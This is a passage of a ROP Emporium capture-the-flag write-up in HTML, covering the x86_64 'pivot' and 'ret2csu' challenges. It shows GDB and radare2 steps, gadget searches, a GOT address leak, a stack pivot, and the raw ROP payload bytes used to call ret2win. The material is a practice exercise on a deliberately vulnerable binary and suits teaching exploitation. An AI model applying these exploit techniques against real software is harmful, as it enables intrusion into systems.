+   0x000000000040096c &lt;+123&gt;:	mov    edi,0x400b48
+   0x0000000000400971 &lt;+128&gt;:	call   0x4006e0 &lt;puts@plt&gt;
+   0x0000000000400976 &lt;+133&gt;:	mov    edi,0x400b34
+   0x000000000040097b &lt;+138&gt;:	mov    eax,0x0
+   0x0000000000400980 &lt;+143&gt;:	call   0x4006f0 &lt;printf@plt&gt;
+   0x0000000000400985 &lt;+148&gt;:	lea    rax,[rbp-0x20]
+   0x0000000000400989 &lt;+152&gt;:	mov    edx,0x40
+   0x000000000040098e &lt;+157&gt;:	mov    rsi,rax
+   0x0000000000400991 &lt;+160&gt;:	mov    edi,0x0
+   0x0000000000400996 &lt;+165&gt;:	call   0x400710 &lt;read@plt&gt;
+[...]
+</code></pre>
+<ul>
+<li>There are two calls to <code>read</code>, set breakpoint at the 2nd call to <code>read</code> so that we can easily send our second input before continuing:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>b *pwnme+165</code></p>
+</blockquote>
+<pre><code>Breakpoint 1 at 0x400996
+</code></pre>
+<ul>
+<li>We also know from the line <code>0x000000000040094c &lt;+91&gt;:	mov rax,QWORD PTR [rbp-0x28]</code> that the memory address of where our 1st input is stored is on the stack at <code>rbp-0x28</code>, so if we dereference address <code>rbp-0x28</code> (i.e. by using a command such as <code>x/16gx *((void**) ($rbp-0x28))</code>) when we have reached the above breakpoint we will be able to see our 1st input</li>
+<li>Let's also print some useful info at each breakpoint by using commands below:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>define hook-stop</code><br />
+&gt;<code>i r</code><br />
+&gt;<code>echo Pivot:\n</code><br />
+&gt;<code>x/16gx *((void**) ($rbp-0x28))</code><br />
+&gt;<code>echo Stack:\n</code><br />
+&gt;<code>x/16gx $rsp</code><br />
+&gt;<code>x/8i $rip</code><br />
+&gt;<code>end</code></p>
+</blockquote>
+<ul>
+<li>Setup is done, so now run the program with input from the FIFO:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>r &lt; my_fifo</code></p>
+</blockquote>
+<ul>
+<li>GDB is waiting for the 1st input, so go to the 2nd terminal to send the input</li>
+</ul>
+<h3 id="2nd-terminal"><a class="header" href="#2nd-terminal">2nd terminal</a></h3>
+<ul>
+<li>The FIFO named <code>my_fifo</code> has already been created, GDB has started running our ELF binary and it's now waiting for 1st input</li>
+<li>Let's simply echo some data and redirect to the FIFO (<code>-n</code> means do <strong>not</strong> output the trailing newline):</li>
+</ul>
+<blockquote>
+<p>$ <code>echo -n &quot;00000000111111112222222233333333444444445555555566666666777777778888888899999999::::::::;;;;;;;;&quot; &gt; my_fifo</code></p>
+</blockquote>
+<ul>
+<li>We know from the GDB session earlier, we've set a breakpoint just before the program asks for our 2nd input, so in the other terminal GDB will now have continued execution and reached that breakpoint</li>
+<li>Let's therefore send our 2nd input:</li>
+</ul>
+<blockquote>
+<p>$ <code>echo -n &quot;AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJ&quot; &gt; my_fifo</code></p>
+</blockquote>
+<ul>
+<li>Now go back to the 1st terminal to continue using GDB</li>
+</ul>
+<h3 id="back-to-1st-terminal"><a class="header" href="#back-to-1st-terminal">Back to 1st Terminal</a></h3>
+<ul>
+<li>Now back in GDB we are at the breakpoint just <strong>before</strong> the program reads the 2nd input, and from the steps above we know we've already sent both 1st and 2nd inputs, but we just haven't yet executed the instruction that reads the 2nd input, so let's look at GDB's output to confirm our understanding</li>
+<li>Instruction pointer is <code>0x400996</code> and we're just before the <code>call 0x400710 &lt;read@plt&gt;</code> instruction:</li>
+</ul>
+<pre><code>rip            0x400996            0x400996 &lt;pwnme+165&gt;
+[...]
+=&gt; 0x400996 &lt;pwnme+165&gt;:	call   0x400710 &lt;read@plt&gt;
+   0x40099b &lt;pwnme+170&gt;:	mov    edi,0x400b69
+</code></pre>
+<ul>
+<li>Pivot address <code>0x7fb2f2a99f10</code> has correctly been dereferenced and <code>16gx</code> of hex output has been printed from that pivot address. In addition, we can see that all 96 bytes of our 1st input <code>00000000111111112222222233333333444444445555555566666666777777778888888899999999::::::::;;;;;;;;</code> has successfully been stored there:</li>
+</ul>
+<pre><code>The Old Gods kindly bestow upon you a place to pivot: 0x7fb2f2a99f10
+[...]
+Pivot:
+0x7fb2f2a99f10:	0x3030303030303030	0x3131313131313131
+0x7fb2f2a99f20:	0x3232323232323232	0x3333333333333333
+0x7fb2f2a99f30:	0x3434343434343434	0x3535353535353535
+0x7fb2f2a99f40:	0x3636363636363636	0x3737373737373737
+0x7fb2f2a99f50:	0x3838383838383838	0x3939393939393939
+0x7fb2f2a99f60:	0x3a3a3a3a3a3a3a3a	0x3b3b3b3b3b3b3b3b
+0x7fb2f2a99f70:	0x0000000000000000	0x0000000000000000
+0x7fb2f2a99f80:	0x0000000000000000	0x0000000000000000
+</code></pre>
+<ul>
+<li>
+<p>From the disassembly (<code>0x0000000000400950 &lt;+95&gt;:	mov edx,0x100</code>), we also know that the 1st input will read up to 0x100 == 256 bytes of input</p>
+</li>
+<li>
+<p>The program hasn't read in our 2nd input yet, so we expect the stack to be also be in a state just prior to receiving that 2nd input</p>
+</li>
+<li>
+<p>Also note that for this execution <code>rbp-0x28 == 0x7ffd738679c0-0x28 == 0x7ffd73867998</code></p>
+</li>
+<li>
+<p>Value stored at <code>0x7ffd73867998</code> is <code>0x00007fb2f2a99f10</code>, which is our pivot address</p>
+</li>
+</ul>
+<pre><code>rbp            0x7ffd738679c0      0x7ffd738679c0
+rsp            0x7ffd73867990      0x7ffd73867990
+[...]
+Stack:
+0x7ffd73867990:	0x00007ffd73867ad0	0x00007fb2f2a99f10
+0x7ffd738679a0:	0x0000000000000000	0x0000000000000000
+0x7ffd738679b0:	0x0000000000000000	0x0000000000000000
+0x7ffd738679c0:	0x00007ffd738679e0	0x00000000004008cc
+0x7ffd738679d0:	0x00007fb2f2a99f10	0x00007fb2f1a9a010
+0x7ffd738679e0:	0x0000000000000000	0x00007fb2f2ac50b3
+0x7ffd738679f0:	0x0000000000000031	0x00007ffd73867ad8
+0x7ffd73867a00:	0x00000001f2c86618	0x0000000000400847
+</code></pre>
+<ul>
+<li>Execute the next instruction and analyse the output:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>ni</code></p>
+</blockquote>
+<pre><code>rax            0x40                64
+rbx            0x4009d0            4196816
+rcx            0x7fb2f2baf142      140406553243970
+rdx            0x40                64
+rsi            0x7ffd738679a0      140726541646240
+rdi            0x0                 0
+rbp            0x7ffd738679c0      0x7ffd738679c0
+rsp            0x7ffd73867990      0x7ffd73867990
+r8             0x2                 2
+r9             0x2                 2
+r10            0x400b34            4197172
+r11            0x246               582
+r12            0x400760            4196192
+r13            0x7ffd73867ad0      140726541646544
+r14            0x0                 0
+r15            0x0                 0
+rip            0x40099b            0x40099b &lt;pwnme+170&gt;
+eflags         0x203               [ CF IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+Pivot:
+0x7fb2f2a99f10:	0x3030303030303030	0x3131313131313131
+0x7fb2f2a99f20:	0x3232323232323232	0x3333333333333333
+0x7fb2f2a99f30:	0x3434343434343434	0x3535353535353535
+0x7fb2f2a99f40:	0x3636363636363636	0x3737373737373737
+0x7fb2f2a99f50:	0x3838383838383838	0x3939393939393939
+0x7fb2f2a99f60:	0x3a3a3a3a3a3a3a3a	0x3b3b3b3b3b3b3b3b
+0x7fb2f2a99f70:	0x0000000000000000	0x0000000000000000
+0x7fb2f2a99f80:	0x0000000000000000	0x0000000000000000
+Stack:
+0x7ffd73867990:	0x00007ffd73867ad0	0x00007fb2f2a99f10
+0x7ffd738679a0:	0x4141414141414141	0x4242424242424242
+0x7ffd738679b0:	0x4343434343434343	0x4444444444444444
+0x7ffd738679c0:	0x4545454545454545	0x4646464646464646
+0x7ffd738679d0:	0x4747474747474747	0x4848484848484848
+0x7ffd738679e0:	0x0000000000000000	0x00007fb2f2ac50b3
+0x7ffd738679f0:	0x0000000000000031	0x00007ffd73867ad8
+0x7ffd73867a00:	0x00000001f2c86618	0x0000000000400847
+=&gt; 0x40099b &lt;pwnme+170&gt;:	mov    edi,0x400b69
+   0x4009a0 &lt;pwnme+175&gt;:	call   0x4006e0 &lt;puts@plt&gt;
+   0x4009a5 &lt;pwnme+180&gt;:	nop
+   0x4009a6 &lt;pwnme+181&gt;:	leave  
+   0x4009a7 &lt;pwnme+182&gt;:	ret    
+   0x4009a8 &lt;uselessFunction&gt;:	push   rbp
+   0x4009a9 &lt;uselessFunction+1&gt;:	mov    rbp,rsp
+   0x4009ac &lt;uselessFunction+4&gt;:	call   0x400720 &lt;foothold_function@plt&gt;
+</code></pre>
+<ul>
+<li>Now we can see that our 2nd input has now only partially been stored on the stack, we've actually overwritten the base pointer and the return address on the stack (<code>0x4848484848484848 == HHHHHHHH</code>)</li>
+<li>If we continue execution, we will segfault:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>c</code></p>
+</blockquote>
+<pre><code>Continuing.
+Thank you!
+
+Program received signal SIGSEGV, Segmentation fault.
+rax            0xb                 11
+rbx            0x4009d0            4196816
+rcx            0x7fb2f2baf1e7      140406553244135
+rdx            0x0                 0
+rsi            0x7fb2f2c8a723      140406554142499
+rdi            0x7fb2f2c8c4c0      140406554150080
+rbp            0x4545454545454545  0x4545454545454545
+rsp            0x7ffd738679c8      0x7ffd738679c8
+r8             0xb                 11
+r9             0x2                 2
+r10            0x400b34            4197172
+r11            0x246               582
+r12            0x400760            4196192
+r13            0x7ffd73867ad0      140726541646544
+r14            0x0                 0
+r15            0x0                 0
+rip            0x4009a7            0x4009a7 &lt;pwnme+182&gt;
+eflags         0x10246             [ PF ZF IF RF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+[...]
+</code></pre>
+<ul>
+<li>Analysis of what happened to our 2nd input <code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJ</code>:
+<ul>
+<li>Only part of our 2nd input was stored on the stack, up to and including <code>HHHHHHHH</code>, but everything else was ignored. This is because the 2nd call to <code>read</code> only accepts 0x40 == 64 bytes of input, as shown in the disassembly line <code>0x0000000000400989 &lt;+152&gt;:	mov edx,0x40</code>.</li>
+<li>The first 32 bytes of the 2nd input doesn't affect anything, but the following 8 bytes <code>EEEEEEEE</code> was where the base pointer was stored.</li>
+<li>After the base pointer, <code>FFFFFFFF</code> was where the return address was stored.</li>
+<li>After the return address, only <code>GGGGGGGGHHHHHHHH</code> was captured and the rest of the 2nd input was ignored.</li>
+<li>Therefore we only have room for 3 ROP gadgets (or more precisely, 24 bytes), i.e. where <code>FFFFFFFFGGGGGGGGHHHHHHHH</code> was situated in our 2nd input.</li>
+</ul>
+</li>
+<li>So as hinted at every point in the challenge, we should perform a stack pivot to give extra room for more gadgets</li>
+<li>In the next section we will search for ROP gadgets that we can use and build the ROP chain</li>
+</ul>
+<h2 id="building-rop-chain-1"><a class="header" href="#building-rop-chain-1">Building ROP Chain</a></h2>
+<ul>
+<li>Open the ELF binary in radare2:</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A ./pivot</code></p>
+</blockquote>
+<ul>
+<li>We want to control the stack pointer, so let's search for gadgets that include <code>rsp</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>/R rsp</code></p>
+</blockquote>
+<pre><code>[...]
+  0x004009bb                 58  pop rax
+  0x004009bc                 c3  ret
+  0x004009bd               4894  xchg rax, rsp
+  0x004009bf                 c3  ret
+[...]
+</code></pre>
+<ul>
+<li>The above gadgets are suitable for our 2nd input as we can use <code>pop rax</code> followed by the address to pivot to, then lastly <code>xchg rax, rsp</code> to get our desired pivot location into rsp (this is a total of 24 bytes, it's as if the maker of this challenge had planned it this way...)</li>
+<li>With the above ROP chain used as our 2nd input, the stack will have pivoted to where our 1st input was placed, so what ROP chain should we place there?</li>
+<li>Let's perform some further analysis on the binary using radare2, first by searching for functions:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>afl</code></p>
+</blockquote>
+<pre><code>[...]
+0x004009a8    1 19           sym.uselessFunction
+0x00400720    1 6            sym.imp.foothold_function
+[...]
+</code></pre>
+<ul>
+<li>Disassemble <code>uselessFunction</code> to see what it does:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>pdf @ sym.uselessFunction</code></p>
+</blockquote>
+<pre><code>╭ 19: sym.uselessFunction ();
+│           0x004009a8      55             push rbp
+│           0x004009a9      4889e5         mov rbp, rsp
+│           0x004009ac      e86ffdffff     call sym.imp.foothold_function
+│           0x004009b1      bf01000000     mov edi, 1                  ; int status
+╰           0x004009b6      e895fdffff     call sym.imp.exit           ; void exit(int status)
+</code></pre>
+<ul>
+<li><code>uselessFunction</code> calls <code>foothold_function</code> then just exits</li>
+<li><code>foothold_function</code> is an imported function, as it is prefixed by <code>sym.imp.</code> so lookup the address in PLT by printing info on imports and performing an internal grep:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>ii ~ foothold_function</code></p>
+</blockquote>
+<pre><code>8   0x00400720 GLOBAL FUNC       foothold_function
+</code></pre>
+<ul>
+<li>Therefore <code>foothold_function</code>'s PLT location is <code>0x400720</code></li>
+<li>Disassemble 3 lines at <code>sym.imp.foothold_function</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>pd3 @ sym.imp.foothold_function</code></p>
+</blockquote>
+<pre><code>        ╎   ; CALL XREF from sym.uselessFunction @ 0x4009ac
+╭ 6: sym.imp.foothold_function ();
+│ bp: 0 (vars 0, args 0)
+│ sp: 0 (vars 0, args 0)
+│ rg: 0 (vars 0, args 0)
+╰       ╎   0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726 ; &quot;&amp;\a@&quot;
+        ╎   0x00400726      6805000000     push 5                      ; 5
+        ╰─&lt; 0x0040072b      e990ffffff     jmp sym..plt
+</code></pre>
+<ul>
+<li>Here we can see <code>foothold_function</code>'s GOT location is <code>0x601040</code></li>
+<li>But what does <code>foothold_function</code> even do? Quit radare2 using <code>q</code> key as many times as necessary then open the libpivot shared object file in radare2:</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A ./libpivot.so</code></p>
+</blockquote>
+<ul>
+<li>Disassemble <code>foothold_function</code>:
+[0x00000890]&gt; <code>pdf @ sym.foothold_function</code></li>
+</ul>
+<pre><code>╭ 19: sym.foothold_function ();
+│           0x0000096a      55             push rbp
+│           0x0000096b      4889e5         mov rbp, rsp
+│           0x0000096e      488d3dab0100.  lea rdi, str.foothold_function__:_Check_out_my_.got.plt_entry_to_gain_a_foothold_into_libpivot ; sym..rodata
+│                                                                      ; 0xb20 ; &quot;foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot&quot; ; const char *s
+│           0x00000975      e8b6feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x0000097a      90             nop
+│           0x0000097b      5d             pop rbp
+╰           0x0000097c      c3             ret
+</code></pre>
+<ul>
+<li>As it turns out, it doesn't seem to directly provide any benefit except for a potential <code>pop rbp</code> gadget, but maybe the library includes something else that might be of use, so list all functions:</li>
+</ul>
+<blockquote>
+<p>[0x00000890]&gt; <code>afl</code></p>
+</blockquote>
+<pre><code>0x00000890    4 50   -&gt; 40   entry0
+0x0000096a    1 19           sym.foothold_function
+[...]
+0x00000a81    3 146          sym.ret2win
+[...]
+</code></pre>
+<ul>
+<li><code>ret2win</code> looks like a winner, so disassemble it to confirm:
+[0x00000890]&gt; <code>pdf @ sym.ret2win</code></li>
+</ul>
+<pre><code>╭ 146: sym.ret2win ();
+│           ; var file*stream @ rbp-0x38
+│           ; var char *s @ rbp-0x30
+│           ; var int64_t var_8h @ rbp-0x8
+│           0x00000a81      55             push rbp
+│           0x00000a82      4889e5         mov rbp, rsp
+│           0x00000a85      4883ec40       sub rsp, 0x40
+│           0x00000a89      64488b042528.  mov rax, qword fs:[0x28]
+│           0x00000a92      488945f8       mov qword [var_8h], rax
+│           0x00000a96      31c0           xor eax, eax
+│           0x00000a98      48c745c80000.  mov qword [stream], 0
+│           0x00000aa0      488d35df0000.  lea rsi, [0x00000b86]       ; &quot;r&quot; ; const char *mode
+│           0x00000aa7      488d3dda0000.  lea rdi, str.flag.txt       ; 0xb88 ; &quot;flag.txt&quot; ; const char *filename
+│           0x00000aae      e8adfdffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
+│           0x00000ab3      488945c8       mov qword [stream], rax
+│           0x00000ab7      48837dc800     cmp qword [stream], 0
+│       ╭─&lt; 0x00000abc      7516           jne 0xad4
+│       │   0x00000abe      488d3dcc0000.  lea rdi, str.Failed_to_open_file:_flag.txt ; 0xb91 ; &quot;Failed to open file: flag.txt&quot; ; const char *s
+│       │   0x00000ac5      e866fdffff     call sym.imp.puts           ; int puts(const char *s)
+│       │   0x00000aca      bf01000000     mov edi, 1                  ; int status
+│       │   0x00000acf      e89cfdffff     call sym.imp.exit           ; void exit(int status)
+│       │   ; CODE XREF from sym.ret2win @ 0xabc
+│       ╰─&gt; 0x00000ad4      488b55c8       mov rdx, qword [stream]     ; FILE *stream
+│           0x00000ad8      488d45d0       lea rax, [s]
+│           0x00000adc      be21000000     mov esi, 0x21               ; '!' ; int size
+│           0x00000ae1      4889c7         mov rdi, rax                ; char *s
+│           0x00000ae4      e867fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
+│           0x00000ae9      488d45d0       lea rax, [s]
+│           0x00000aed      4889c7         mov rdi, rax                ; const char *s
+│           0x00000af0      e83bfdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00000af5      488b45c8       mov rax, qword [stream]
+│           0x00000af9      4889c7         mov rdi, rax                ; FILE *stream
+│           0x00000afc      e83ffdffff     call sym.imp.fclose         ; int fclose(FILE *stream)
+│           0x00000b01      48c745c80000.  mov qword [stream], 0
+│           0x00000b09      bf00000000     mov edi, 0                  ; int status
+╰           0x00000b0e      e85dfdffff     call sym.imp.exit           ; void exit(int status)
+</code></pre>
+<ul>
+<li>It opens flag.txt and prints it out, so now we have a potential solution, which will involve looping back to the beginning of the program:
+<ul>
+<li>In the 1st input of the 1st program loop iteration we need to:
+<ul>
+<li>Call <code>foothold_function</code> from the PLT to resolve its memory address</li>
+<li>Print the resolved location of <code>foothold_function</code> by placing the GOT pointer into rdi and then immediately calling <code>puts</code> afterwards (note that we must capture this printed resolved address of <code>foothold_function</code> for use later)</li>
+<li>Return back the very start of the program, but this time we know the location of all the imported libpivot addresses because their positions are relative to the resolved address of <code>foothold_function</code></li>
+</ul>
+</li>
+<li>In the 2nd input of the 1st program loop iteration we place 40 bytes of padding (because the rbp value isn't important) then followed by our ROP chain that pivots the stack to where our 1st input is stored</li>
+<li>In the 1st input of the 2nd program loop iteration we can put anything here, as it won't be used</li>
+<li>In the 2nd input of the 2nd program loop iteration we place 40 bytes of padding (because the rbp value isn't important) then followed by the resolved address of <code>foothold_function</code> which we leaked in the 1st program loop iteration</li>
+</ul>
+</li>
+<li>With the plan in place, we just need memory addresses for <code>start</code>, <code>pop_rdi</code>, <code>puts_plt</code> and the address of <code>ret2win</code> relative to <code>foothold_function</code>, so quit radare2 then open the main ELF binary in radare2 again:</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A ./pivot</code></p>
+</blockquote>
+<ul>
+<li>When we've just opened the binary in radare2 the seek point is already at the program's entry point <code>0x400760</code> (our <code>start</code> location to loop back to), which we can confirm using <code>ie</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>ie</code></p>
+</blockquote>
+<pre><code>[Entrypoints]
+vaddr=0x00400760 paddr=0x00000760 haddr=0x00000018 hvaddr=0x00400018 type=program
+
+1 entrypoints
+</code></pre>
+<ul>
+<li>Now search for the <code>pop rdi</code> gadget, which we find out is at <code>0x400a33</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>/R pop rdi</code></p>
+</blockquote>
+<pre><code>  0x00400a33                 5f  pop rdi
+  0x00400a34                 c3  ret
+</code></pre>
+<ul>
+<li>Then get the location of <code>puts</code> in the PLT, which we find out is at <code>0x4006e0</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400760]&gt; <code>ii ~ puts</code></p>
+</blockquote>
+<pre><code>2   0x004006e0 GLOBAL FUNC       puts
+</code></pre>
+<ul>
+<li>Lastly, quit radare2 and move on to the next section where we'll get the address of <code>ret2win</code> relative to <code>foothold_function</code></li>
+</ul>
+<h2 id="address-of-ret2win-relative-to-foothold_function"><a class="header" href="#address-of-ret2win-relative-to-foothold_function">Address of <code>ret2win</code> Relative to <code>foothold_function</code></a></h2>
+<ul>
+<li>We'll use <a href="https://www.man7.org/linux/man-pages/man1/nm.1.html"><code>nm</code></a> to find the offset</li>
+</ul>
+<blockquote>
+<p>$ <code>nm -D ./libpivot.so</code></p>
+</blockquote>
+<pre><code>[...]
+000000000000096a T foothold_function
+[...]
+0000000000000a81 T ret2win
+</code></pre>
+<ul>
+<li>0xa81-0x96a == 0x117 == 279</li>
+<li>i.e. resolved <code>foothold_function</code> address + 0x117 == <code>ret2win</code> address</li>
+<li>All the pieces of the puzzle have been collected, so just write a Python script to get the flag</li>
+</ul>
+<h2 id="python-script-to-get-the-flag"><a class="header" href="#python-script-to-get-the-flag">Python Script to Get the Flag</a></h2>
+<ul>
+<li>The <a href="rop_emporium/solutions/x86_64/07-pivot/./get_flag.py">get_flag.py</a> Python script (using <a href="https://github.com/Gallopsled/pwntools">Pwntools</a>) is included for reference. Run it from the same directory as the challenge files:</li>
+</ul>
+<blockquote>
+<p>$ <code>python get_flag.py</code></p>
+</blockquote>
+<pre><code>pivot by ROP Emporium
+x86_64
+
+Call ret2win() from libpivot
+The Old Gods kindly bestow upon you a place to pivot: 0x7f60a185ef10
+Stack pivot: 0x7f60a185ef10
+Send a ROP chain now and it will land there
+&gt; b' \x07@\x00\x00\x00\x00\x003\n@\x00\x00\x00\x00\x00@\x10`\x00\x00\x00\x00\x00\xe0\x06@\x00\x00\x00\x00\x00`\x07@\x00\x00\x00\x00\x00'
+Thank you!
+
+Now please send your stack smash
+&gt; b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\xf0\x85\xa1`\x7f\x00\x00\xbb\t@\x00\x00\x00\x00\x00\x10\xef\x85\xa1`\x7f\x00\x00\xbd\t@\x00\x00\x00\x00\x00'
+Thank you!
+foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
+
+foothold_function address: 0x7f60a1a6196a
+b'\x90\x90\x90\x90\x90\x90\x90\x90'
+Thank you!
+
+Now please send your stack smash
+&gt; b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\x90\x90\x90\x90\x81\x1a\xa6\xa1`\x7f\x00\x00'
+Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rop-emporium---08-ret2csu-x86_64"><a class="header" href="#rop-emporium---08-ret2csu-x86_64">ROP Emporium - 08 ret2csu x86_64</a></h1>
+<h2 id="elf-binary-info-7"><a class="header" href="#elf-binary-info-7">ELF Binary Info</a></h2>
+<blockquote>
+<p>$ <code>rabin2 -I ./ret2csu</code></p>
+</blockquote>
+<pre><code>arch     x86
+baddr    0x400000
+binsz    6441
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    .
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<ul>
+<li>canary false</li>
+<li>nx true (i.e. DEP enabled)</li>
+<li>pic false (i.e. not PIE)</li>
+</ul>
+<h2 id="goal"><a class="header" href="#goal">Goal</a></h2>
+<ul>
+<li><code>ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</code></li>
+<li>Call the ret2win function with arguments:
+<ul>
+<li>rdi = 0xdeadbeefdeadbeef</li>
+<li>rsi = 0xcafebabecafebabe</li>
+<li>rdx = 0xd00df00dd00df00d</li>
+</ul>
+</li>
+</ul>
+<h2 id="check-buffer-overflow"><a class="header" href="#check-buffer-overflow">Check Buffer Overflow</a></h2>
+<ul>
+<li>Open ELF Binary in GDB (<code>-q</code> is for quiet mode):</li>
+</ul>
+<blockquote>
+<p>$ <code>gdb ./ret2csu -q</code><br />
+(gdb) <code>r</code></p>
+</blockquote>
+<pre><code>[...]
+&gt; AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG
+Thank you!
+
+Program received signal SIGSEGV, Segmentation fault.
+[...]
+</code></pre>
+<ul>
+<li>Program seg-faulted, so analyse registers and stack to see what amount of data is required to overflow buffer:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>i r</code></p>
+</blockquote>
+<pre><code>[...]
+rbp            0x4545454545454545  0x4545454545454545
+rsp            0x7ffc24812018      0x7ffc24812018
+[...]
+</code></pre>
+<blockquote>
+<p>(gdb) <code>x/4gx $rsp</code></p>
+</blockquote>
+<pre><code>0x7ffc24812018:	0x4646464646464646	0x4747474747474747
+0x7ffc24812028:	0x00007fe5d4da300a	0x0000000000000031
+</code></pre>
+<ul>
+<li>0x4545454545454545 == &quot;EEEEEEEE&quot;</li>
+<li>0x4646464646464646 == &quot;FFFFFFFF&quot;</li>
+<li>Therefore buffer is 32 bytes in size, after that is the base pointer followed by the return address</li>
+</ul>
+<h2 id="look-for-rop-gadgets-1"><a class="header" href="#look-for-rop-gadgets-1">Look for ROP Gadgets</a></h2>
+<ul>
+<li>We know from the challenge's goal (i.e. <code>ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</code>), rdi, rsi and rdx registers need to be set</li>
+<li>Open ELF binary in radare2 for further analysis:</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A ./ret2csu</code></p>
+</blockquote>
+<ul>
+<li>Look for ROP gadgets that can control rdx:</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/R rdx</code></p>
+</blockquote>
+<pre><code>[...]
+  0x00400680             4c89fa  mov rdx, r15
+  0x00400683             4c89f6  mov rsi, r14
+  0x00400686             4489ef  mov edi, r13d
+  0x00400689           41ff14dc  call qword [r12 + rbx*8]
+</code></pre>
+<ul>
+<li>
+<p>With above gadget, rdx and rsi can be controlled if we first have control over r15 and 14 respectively</p>
+</li>
+<li>
+<p>NOTE 1: Gadget ends with a <code>call</code>, not a <code>ret</code></p>
+</li>
+<li>
+<p>NOTE 2: The <code>call qword [r12 + rbx*8]</code> instruction makes a call to a <strong>pointer</strong> to a function (i.e. the function's memory address needs to be stored somewhere else in memory, which we then reference)</p>
+</li>
+<li>
+<p>NOTE 3: The <code>mov edi, r13d</code> instruction will not help set rdi, so rdi will have to be set afterwards separately</p>
+</li>
+<li>
+<p>Look for ROP gadgets that can control r12, r14, r15:</p>
+</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/R pop r12</code></p>
+</blockquote>
+<pre><code>  0x0040069c               415c  pop r12
+  0x0040069e               415d  pop r13
+  0x004006a0               415e  pop r14
+  0x004006a2               415f  pop r15
+  0x004006a4                 c3  ret
+</code></pre>
+<ul>
+<li>Look for ROP gadgets that can control rdi:</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/R pop rdi</code></p>
+</blockquote>
+<pre><code>  0x004006a3                 5f  pop rdi
+  0x004006a4                 c3  ret
+</code></pre>
+<blockquote>
+<ul>
+<li>As a sidenote, the <code>pop r12; pop r13; pop r14; pop r15; ret</code> gadget and the <code>mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]</code> gadget are both part of the <code>__libc_csu_init</code> function. We can see that by printing the function's disassembly:</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>pdf @ sym.__libc_csu_init</code></p>
+</blockquote>
+<pre><code>[...]
+│       ╭─&lt; 0x00400674      7420           je 0x400696
+│       │   0x00400676      31db           xor ebx, ebx
+│       │   0x00400678      0f1f84000000.  nop dword [rax + rax]
+│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400694
+│      ╭──&gt; 0x00400680      4c89fa         mov rdx, r15                ; char **ubp_av
+│      ╎│   0x00400683      4c89f6         mov rsi, r14                ; int argc
+│      ╎│   0x00400686      4489ef         mov edi, r13d               ; func main
+│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
+│      ╎│   0x0040068d      4883c301       add rbx, 1
+│      ╎│   0x00400691      4839dd         cmp rbp, rbx
+│      ╰──&lt; 0x00400694      75ea           jne 0x400680
+│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400674
+│       ╰─&gt; 0x00400696      4883c408       add rsp, 8
+│           0x0040069a      5b             pop rbx
+│           0x0040069b      5d             pop rbp
+│           0x0040069c      415c           pop r12
+│           0x0040069e      415d           pop r13
+│           0x004006a0      415e           pop r14
+│           0x004006a2      415f           pop r15
+╰           0x004006a4      c3             ret
+</code></pre>
+<ul>
